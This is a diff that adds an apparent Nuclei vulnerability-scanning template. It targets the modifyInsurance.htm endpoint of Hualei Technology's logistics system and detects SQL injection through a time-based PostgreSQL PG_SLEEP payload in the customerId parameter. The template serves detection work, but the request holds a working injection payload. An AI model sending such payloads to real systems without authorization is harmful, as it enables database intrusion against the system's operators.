@@ -1,0 +1,45 @@
+id: poc-yaml-hualei-technology-modifyinsurance-sqli
+info:
+  name: 华磊科技物流系统 modifyInsurance SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId= HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "客户ID不能为空"
+
+  - raw:
+      - |
+        GET /modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP({{t1}})) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
